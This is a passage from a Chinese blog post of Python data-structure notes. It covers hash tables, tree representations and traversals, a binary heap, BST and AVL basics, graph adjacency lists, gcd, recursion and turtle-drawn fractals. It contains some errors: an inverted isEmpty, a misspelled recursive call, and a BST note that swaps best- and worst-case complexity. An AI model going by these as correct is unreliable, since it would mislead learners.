self.data[position]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                position = self.rehash(position)</span><br><span class="line">                <span class="keyword">if</span> position == startslot:</span><br><span class="line">                    stop = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment"># 索引查找</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">return</span> self.get(key)</span><br><span class="line">    <span class="comment"># 索引设置</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, data</span>):</span><br><span class="line">        self.put(key,data)</span><br></pre></td></tr></table></figure><hr><h2 id="六、树"><a href="#六、树" class="headerlink" title="六、树"></a>六、树</h2><h3 id="1-术语"><a href="#1-术语" class="headerlink" title="1 术语"></a>1 术语</h3><blockquote><p>基本同C语言。</p></blockquote><div class="table-container"><table><thead><tr><th>名称</th><th>意义</th></tr></thead><tbody><tr><td>入边</td><td>进入该节点的边</td></tr><tr><td>出边</td><td>离开该节点的边</td></tr></tbody></table></div><h3 id="2-列表嵌套法"><a href="#2-列表嵌套法" class="headerlink" title="2 列表嵌套法"></a>2 列表嵌套法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二叉树</span></span><br><span class="line">myTree = [root,left,right]</span><br><span class="line"><span class="comment"># 多叉树</span></span><br><span class="line">myTree = [root,first,second,third,...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,r:<span class="built_in">any</span></span>):</span><br><span class="line">        self.BinaryTree = [r,[],[]]</span><br><span class="line">    <span class="comment"># 左子树插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertLeft</span>(<span class="params">self,root,newBrance</span>):</span><br><span class="line">        t = root.pop(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(t) &gt; <span class="number">1</span>:</span><br><span class="line">            root.insert(<span class="number">1</span>,[newBrance,t,[]])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            root.insert(<span class="number">1</span>,[newBrance,[],[]])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">    <span class="comment"># 右子树插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertRight</span>(<span class="params">self,root,newBrance</span>):</span><br><span class="line">        t = root.pop(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(t) &gt; <span class="number">1</span>:</span><br><span class="line">            root.insert(<span class="number">2</span>,[newBrance,t,[]])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            root.insert(<span class="number">2</span>,[newBrance,[],[]])</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure><h3 id="3-节点链接法"><a href="#3-节点链接法" class="headerlink" title="3 节点链接法"></a>3 节点链接法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,rootObj</span>):</span><br><span class="line">        self.key = rootObj</span><br><span class="line">        self.leftChild = <span class="literal">None</span></span><br><span class="line">        self.rightChild = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 左插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertLeft</span>(<span class="params">self,newNode</span>):</span><br><span class="line">        <span class="keyword">if</span> self.leftChild == <span class="literal">None</span>:</span><br><span class="line">            self.leftChild = BinaryTree(newNode)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = BinaryTree(newNode)</span><br><span class="line">            t.leftChild = self.leftChild</span><br><span class="line">            self.leftChild = t</span><br><span class="line">    <span class="comment"># 右插入</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insertRight</span>(<span class="params">self,newNode</span>):</span><br><span class="line">        <span class="keyword">if</span> self.rightChild == <span class="literal">None</span>:</span><br><span class="line">            self.rightChild = BinaryTree(newNode)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = BinaryTree(newNode)</span><br><span class="line">            t.rightChild = self.rightChild</span><br><span class="line">            self.rightChild = t</span><br></pre></td></tr></table></figure><h3 id="4-表达式树"><a href="#4-表达式树" class="headerlink" title="4 表达式树"></a>4 表达式树</h3><blockquote><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/表达式树.py">my::表达式树</a>  </p><p>求表达式值</p><p>例：$((5+((3+7)<em>(4-1)))+(4</em>5))$</p><p>思路：碰到左括号左下降，碰到数字记录后回升，碰到操作数记录后右下降，碰到右括号回升，留一个栈记录父节点。</p></blockquote><h3 id="5-树的遍历"><a href="#5-树的遍历" class="headerlink" title="5 树的遍历"></a>5 树的遍历</h3><ul><li><p>前序遍历（preorder）：NLR</p><blockquote><p>先根再递归前序访问左子树，最后前序访问右子树。</p></blockquote></li><li><p>中序遍历（inorder）：LNR</p><blockquote><p>先递归地中序访问左子树，再访问根，最后中序访问右子树。</p></blockquote></li><li><p>后序遍历（postorder）：LRN</p><blockquote><p>先递归地后序访问左子树，再后序访问右子树，最后访问根。</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TreeOrder</span>:</span><br><span class="line"><span class="comment"># 前序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">self,tree:BinaryTree</span>):</span><br><span class="line">        <span class="keyword">if</span> tree:</span><br><span class="line">            <span class="built_in">print</span>(tree.getRootVal())</span><br><span class="line">            self.preorder(tree.getLeftChild())</span><br><span class="line">            self.preorder(tree.getRightChild())</span><br><span class="line"><span class="comment"># 中序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inorder</span>(<span class="params">self,tree:BinaryTree</span>):</span><br><span class="line">        <span class="keyword">if</span> tree:</span><br><span class="line">            self.inorder(tree.getLeftChild())</span><br><span class="line">            <span class="built_in">print</span>(tree.getRootVal())</span><br><span class="line">            self.inorder(tree.getRightChild())</span><br><span class="line"><span class="comment"># 后序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">postorder</span>(<span class="params">self,tree:BinaryTree</span>):</span><br><span class="line">        <span class="keyword">if</span> tree:</span><br><span class="line">            self.postorder(tree.getLeftChild())</span><br><span class="line">            self.postorder(tree.getRightChild())</span><br><span class="line">            <span class="built_in">print</span>(tree.getRootVal())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 另一种表示</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.key)</span><br><span class="line">        <span class="keyword">if</span> self.leftChild:</span><br><span class="line">            self.leftChild.preoder()</span><br><span class="line">        <span class="keyword">if</span> self.rightChild:</span><br><span class="line">            self.rightChild.preorder()</span><br></pre></td></tr></table></figure><h3 id="6-二叉堆实现优先队列"><a href="#6-二叉堆实现优先队列" class="headerlink" title="6 二叉堆实现优先队列"></a>6 二叉堆实现优先队列</h3><blockquote><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/6_5.二叉堆.py">my::二叉堆</a></p><p>最小 key 排在队首称为最小堆（min heap），反之是最大堆。（max heap）</p><p>实现：完全二叉树。</p><p>堆次序：任何一个节点 x ，其父节点 p 中的 key 均小于 x 中的 key。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryHeap</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.heapList = [<span class="number">0</span>]</span><br><span class="line">        self.currentSize = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 上浮</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">percUp</span>(<span class="params">self, i:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">while</span> i // <span class="number">2</span> &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> self.heapList[i] &lt; self.heapList[i // <span class="number">2</span>]:</span><br><span class="line">                self.heapList[i],self.heapList[i // <span class="number">2</span>] = self.heapList[i // <span class="number">2</span>],self.heapList[i]</span><br><span class="line">            i //= <span class="number">2</span></span><br><span class="line">    <span class="comment"># 下沉</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">percDown</span>(<span class="params">self,i:<span class="built_in">int</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">while</span> i * <span class="number">2</span> &lt;= self.currentSize:</span><br><span class="line">            mc = self.minChild(i)</span><br><span class="line">            <span class="keyword">if</span> self.heapList[i] &gt; self.heapList[mc]:</span><br><span class="line">                self.heapList[i],self.heapList[mc] = self.heapList[mc],self.heapList[i]</span><br><span class="line">            i = mc</span><br><span class="line">    <span class="comment"># 最小子孩子</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minChild</span>(<span class="params">self,i:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> i * <span class="number">2</span> + <span class="number">1</span> &gt; self.currentSize:</span><br><span class="line">            <span class="keyword">return</span> i * <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.heapList[i * <span class="number">2</span>] &lt; self.heapList[i * <span class="number">2</span> + <span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> i * <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 插入后上浮保持有序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        self.heapList.append(key)</span><br><span class="line">        self.currentSize += <span class="number">1</span></span><br><span class="line">        self.percUp(self.currentSize)</span><br><span class="line">    <span class="comment"># 插入后尾节点替换主根，然后下沉保持有序</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findMin</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">if</span> self.size() &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.heapList[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delMin</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        retval = self.heapList[<span class="number">1</span>]</span><br><span class="line">        self.heapList[<span class="number">1</span>] = self.heapList[self.currentSize]</span><br><span class="line">        self.currentSize -= <span class="number">1</span></span><br><span class="line">        self.heapList.pop()</span><br><span class="line">        self.percDown(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> retval</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isEmpty</span>(<span class="params">self</span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> self.currentSize &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.currentSize</span><br><span class="line">    <span class="comment"># 下沉法控制时间是O(n)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buildHeap</span>(<span class="params">self,lst:<span class="built_in">list</span></span>):</span><br><span class="line">        i = <span class="built_in">len</span>(lst) // <span class="number">2</span></span><br><span class="line">        self.currentSize = <span class="built_in">len</span>(lst)</span><br><span class="line">        self.heapList = [<span class="number">0</span>] + lst[:]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(self.heapList),i)</span><br><span class="line">        <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(self.heapList,i)</span><br><span class="line">            self.percDown(i)</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(self.heapList,i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间：O(log n)</span></span><br></pre></td></tr></table></figure><h3 id="7-二叉查找树"><a href="#7-二叉查找树" class="headerlink" title="7 二叉查找树"></a>7 二叉查找树</h3><blockquote><p>实现：有序表数据结构 + 二分搜索  ||  散列表数据结构 + 散列及冲突解决</p><p>性质：比父节点小的 key 都出现在左子树，比父节点大的 key 都出现在右子树。</p><p>普通二叉查找树最坏：O( log n )，最好：O( n )（单链表），插入时受数据顺序影响，最终会形成不同的二叉查找树。    </p><p><a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/6_6.二叉查找树.py">my::二叉查找树</a></p></blockquote><h3 id="8-AVL树"><a href="#8-AVL树" class="headerlink" title="8 AVL树"></a>8 AVL树</h3><blockquote><p>平衡二叉查找树。</p><p>平衡因子：高度差，大于0左重，小于0右重，若每个节点平衡因子都在 [-1,0,1] 之中则成为平衡树。</p><p>时间：O( log n )（类似斐波那契数列）</p></blockquote><hr><h2 id="七、图（Graph）"><a href="#七、图（Graph）" class="headerlink" title="七、图（Graph）"></a>七、图（Graph）</h2><h3 id="1-术语-1"><a href="#1-术语-1" class="headerlink" title="1 术语"></a>1 术语</h3><blockquote><p>若有向图中不存在任何圈，则称作 “ 有向无圈图 directed acyclic graph：DAG “（树是一种DAG，该问题更简单）</p></blockquote><div class="table-container"><table><thead><tr><th>名称</th><th>意义</th></tr></thead><tbody><tr><td>顶点Vertex（节点Node）</td><td>图的基本组成部分，顶点具有名称标识Key，也可以携带数据项payload</td></tr><tr><td>边Edge（弧Arc）</td><td>边连接两个顶点，可以有向或者无向</td></tr><tr><td>权重Weight</td><td>从一个顶点到另一个顶点的代价</td></tr><tr><td>路径Path</td><td>由边依次连接起来的顶点序列。无权路径的长度为边的数量，带权是权重和</td></tr><tr><td>圈Cycle</td><td>首尾顶点相同的路径</td></tr><tr><td>V</td><td>顶点集合</td></tr><tr><td>E</td><td>边集合</td></tr><tr><td>e=( v , w )</td><td>E中每条边 e=( v , w )，v 和 w 都是V中顶点</td></tr><tr><td>子图</td><td>V 和 E 的子集</td></tr></tbody></table></div><h3 id="2-邻接矩阵"><a href="#2-邻接矩阵" class="headerlink" title="2 邻接矩阵"></a>2 邻接矩阵</h3><blockquote><p>优点：简单，容易得到顶点如何连接。</p><p>缺点：边数少会变成稀疏矩阵。</p></blockquote><p><img src="/posts/4b0178e0/领接矩阵.jpg" alt></p><h3 id="3-邻接表"><a href="#3-邻接表" class="headerlink" title="3 邻接表"></a>3 邻接表</h3><blockquote><p> <a href="https://github.com/Magialeaf/Course/blob/main/Data_Structure/7_1.ADT Graph.py">my::邻接表 </a></p><p>维护一个包含所有顶点的主列表(master list)，主列表中的每个顶点再关联一个与自身有边连接的所有顶点的列表。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vertex</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">any</span></span>):</span><br><span class="line">        self.<span class="built_in">id</span> = key</span><br><span class="line">        self.connectedTo = &#123;&#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNeighbor</span>(<span class="params">self, nbr:<span class="built_in">object</span>, weight=<span class="number">0</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.connectedTo[nbr] = weight</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;[&#123;0&#125;]&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(self.<span class="built_in">id</span>)) + <span class="string">&#x27;&lt;-&gt;&#x27;</span> + <span class="built_in">str</span>([x.<span class="built_in">id</span> <span class="keyword">for</span> x <span class="keyword">in</span> self.connectedTo])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getConnections</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.connectedTo.keys()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getId</span>(<span class="params">self</span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getWeight</span>(<span class="params">self,nbr:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">return</span> self.connectedTo[nbr]</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.vertList = &#123;&#125;</span><br><span class="line">        self.numVertices = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addVertex</span>(<span class="params">self,key:<span class="built_in">any</span></span>)-&gt;Vertex:</span><br><span class="line">        self.numVertices += <span class="number">1</span></span><br><span class="line">        newVertex = Vertex(key)</span><br><span class="line">        self.vertList[key] = newVertex</span><br><span class="line">        <span class="keyword">return</span> newVertex</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getVertex</span>(<span class="params">self,vKey:<span class="built_in">any</span></span>)-&gt;<span class="built_in">any</span>:</span><br><span class="line">        <span class="keyword">if</span> vKey <span class="keyword">in</span> self.vertList:</span><br><span class="line">            <span class="keyword">return</span> self.vertList[vKey]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, vKey:<span class="built_in">any</span></span>)-&gt;<span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">return</span> vKey <span class="keyword">in</span> self.vertList</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addEdge</span>(<span class="params">self,fromVert:<span class="built_in">any</span>,toVert:<span class="built_in">any</span>,weight:<span class="built_in">any</span></span>)-&gt;<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> fromVert <span class="keyword">not</span> <span class="keyword">in</span> self.vertList:</span><br><span class="line">            newVertex = self.addVertex(fromVert)</span><br><span class="line">        <span class="keyword">if</span> toVert <span class="keyword">not</span> <span class="keyword">in</span> self.vertList:</span><br><span class="line">            newVertex = self.addVertex(toVert)</span><br><span class="line">        self.vertList[fromVert].addNeighbor(self.vertList[toVert],weight)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Vertices</span>(<span class="params">self</span>)-&gt;<span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(self.vertList.keys())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>)-&gt;<span class="built_in">iter</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">iter</span>(self.vertList.values())</span><br></pre></td></tr></table></figure><h3 id="4-骑士周游问题"><a href="#4-骑士周游问题" class="headerlink" title="4 骑士周游问题"></a>4 骑士周游问题</h3><blockquote><p>哈密顿通路(回路)与哈密顿图 (Hamilton图) 通过图G的每个结点一次，且仅一次的通路(回路)，就是哈密顿通路(回路). 存在<a href="https://baike.so.com/doc/6532070-6745806.html">哈密顿回路</a>的图就是哈密顿图。</p><p>利用深度优先：O（k ** N）（N是棋盘格数）</p><p>改进：启发式规则：预先知道下一步的格子中的选择有多少种，优先选择下一个格子的选择少的那个格子。</p></blockquote><h3 id="5-拓扑排序"><a href="#5-拓扑排序" class="headerlink" title="5 拓扑排序"></a>5 拓扑排序</h3><blockquote><p>处理一个DAG，输出顶点的线性序列。广泛应用于依赖事件的排期上。（有先后顺序的多个事件）。</p><p>利用 dfs_visit 从某点出发遍历后续事件，得到事件一个列表。</p></blockquote><hr><h2 id="八、python算法"><a href="#八、python算法" class="headerlink" title="八、python算法"></a>八、python算法</h2><h3 id="1-最大公约数"><a href="#1-最大公约数" class="headerlink" title="1 最大公约数"></a>1 最大公约数</h3><blockquote><p>欧几里得算法 / 辗转相除法：</p><p>input m,n<br>tag:<br>r = m mod n<br>if r == 0 : return n<br>else :  m,n = n,r ; jmp tag ;  </p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">num1,num2</span>):</span><br><span class="line">    <span class="keyword">while</span> num2 != <span class="number">0</span>:</span><br><span class="line">        temp = num1</span><br><span class="line">        num1 = num2</span><br><span class="line">        num2 = temp % num2</span><br><span class="line">    <span class="keyword">return</span> num1</span><br></pre></td></tr></table></figure><h3 id="2-递归"><a href="#2-递归" class="headerlink" title="2 递归"></a>2 递归</h3><blockquote><p><a href="https://pythontutor.com/">模拟树</a></p><p>数量统计递归，可以从上到下传递一个值，也可以从下到上返回一个值。同时维护一个全局变量，每次更新值就更新全局变量。（最大或最小）</p><p><code>sys.getrecursionlimit()</code>：获得最大递归层数<br><code>sys.setrecursionlimit(num)</code>：设置最大递归层数。</p></blockquote><ul><li><p>递归三要素</p><ol><li>递归算法必须有一个基本结束条件。（最小规模问题的直接解决）</li><li>递归算法必须能改变状态向基本结束条件演进。（减小问题规模）</li><li>递归算法必须调用自身。（解决减小了规模的相同问题）</li></ol></li><li><p><a href="https://blog.csdn.net/jmh1996/article/details/82827579">master主定理</a> </p><blockquote><p>递归公式：$T(n)=a*T(n/b)+n^d$，其中 a &gt; 1 , b &gt; 1 , d &gt; 0。</p><ol><li>$a &lt; b^d $||$log_ba &lt; d$，$T(n) = O(n^d)$</li><li>$a = b^d$ || $log_ba = d$，$T(n) = O(n^{log_ba}*log n)$</li><li>$a &gt; b^d$ || $log_ba &gt; d$，$T(n)=O(n^{log_ba})$</li></ol></blockquote></li><li><p>例题</p><ul><li><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></li><li><a href="https://leetcode.cn/problems/same-tree/">100. 相同的树</a></li><li><a href="https://leetcode.cn/problems/symmetric-tree/">101. 对称二叉树</a></li><li><a href="https://leetcode.cn/problems/balanced-binary-tree/">110. 平衡二叉树</a></li><li><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></li></ul></li></ul><ul><li><p>案例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 递归求和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">nums:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>] + add(nums[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进制转化</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convertNum</span>(<span class="params">num:<span class="built_in">int</span>,base:<span class="built_in">int</span>=<span class="number">2</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    dic = &#123;<span class="number">1</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;F&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> num &lt; base:</span><br><span class="line">        <span class="keyword">return</span> dic[num]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a,b = <span class="built_in">divmod</span>(num,base)</span><br><span class="line">        <span class="keyword">return</span> convertNum(a,base) + <span class="built_in">str</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二叉树</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tree</span>(<span class="params">t:turtle.Turtle,brance_len:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="comment"># 树干太短不画，即递归结束条件</span></span><br><span class="line">    <span class="keyword">if</span> brance_len &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># 画树干</span></span><br><span class="line">        t.forward(brance_len)</span><br><span class="line">        <span class="comment"># 右倾斜20度</span></span><br><span class="line">        t.right(<span class="number">20</span>)</span><br><span class="line">        <span class="comment"># 递归调用，画右边的小数，树干减15</span></span><br><span class="line">        tree(t,brance_len-<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># 向左回40度，即左倾斜20度</span></span><br><span class="line">        t.left(<span class="number">40</span>)</span><br><span class="line">        <span class="comment"># 递归调用，画左边的小数，树干减15</span></span><br><span class="line">        tree(t,brance_len-<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># 向右回20度，即回正</span></span><br><span class="line">        t.right(<span class="number">20</span>)</span><br><span class="line">        <span class="comment"># 海龟回到原位置</span></span><br><span class="line">        t.backward(brance_len)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = turtle.Turtle()</span><br><span class="line">    t.left(<span class="number">90</span>)</span><br><span class="line">    t.penup()</span><br><span class="line">    t.backward(<span class="number">100</span>)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.pencolor(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    t.pensize(<span class="number">2</span>)</span><br><span class="line">    tree(t,<span class="number">75</span>)</span><br><span class="line">    t.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 谢尔宾斯基三角形：</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="comment">#  points表示当前绘制的大三角形的三个顶点，degree表示当前的度，或者级别，必须大于0，才继续绘制，myTurtle是还会作图对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sierpinski</span>(<span class="params">points, degree, myTurtle</span>):</span><br><span class="line">    colormap = [<span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]</span><br><span class="line">    <span class="comment"># 绘制大三角形，从颜色列表中根据degree选择一种颜色</span></span><br><span class="line">    draw_triangle(points, colormap[degree - <span class="number">1</span>], myTurtle)</span><br><span class="line">    <span class="keyword">if</span> degree &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 绘制左下角三角形</span></span><br><span class="line">        sierpinski([points[<span class="number">0</span>], get_middle(points[<span class="number">0</span>], points[<span class="number">1</span>]), get_middle(points[<span class="number">0</span>], points[<span class="number">2</span>])], degree - <span class="number">1</span>,</span><br><span class="line">                   myTurtle)</span><br><span class="line">        <span class="comment"># 绘制上方的三角形</span></span><br><span class="line">        sierpinski([points[<span class="number">1</span>], get_middle(points[<span class="number">0</span>], points[<span class="number">1</span>]), get_middle(points[<span class="number">1</span>], points[<span class="number">2</span>])], degree - <span class="number">1</span>,</span><br><span class="line">                   myTurtle)</span><br><span class="line">        <span class="comment"># 绘制右下角三角形</span></span><br><span class="line">        sierpinski([points[<span class="number">2</span>], get_middle(points[<span class="number">2</span>], points[<span class="number">1</span>]), get_middle(points[<span class="number">0</span>], points[<span class="number">2</span>])], degree - <span class="number">1</span>,</span><br><span class="line">                   myTurtle)</span><br><span class="line"><span class="comment"># 绘制一个三角形</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_triangle</span>(<span class="params">points, color,myTurtle</span>):</span><br><span class="line">    myTurtle.fillcolor(color)</span><br><span class="line">    myTurtle.up()</span><br><span class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>],points[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    myTurtle.down()</span><br><span class="line">    myTurtle.begin_fill()</span><br><span class="line">    <span class="comment"># 绘制左边</span></span><br><span class="line">    myTurtle.goto(points[<span class="number">1</span>][<span class="number">0</span>],points[<span class="number">1</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 绘制右边</span></span><br><span class="line">    myTurtle.goto(points[<span class="number">2</span>][<span class="number">0</span>], points[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 绘制底边</span></span><br><span class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>], points[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">    myTurtle.end_fill()</span><br><span class="line"><span class="comment"># 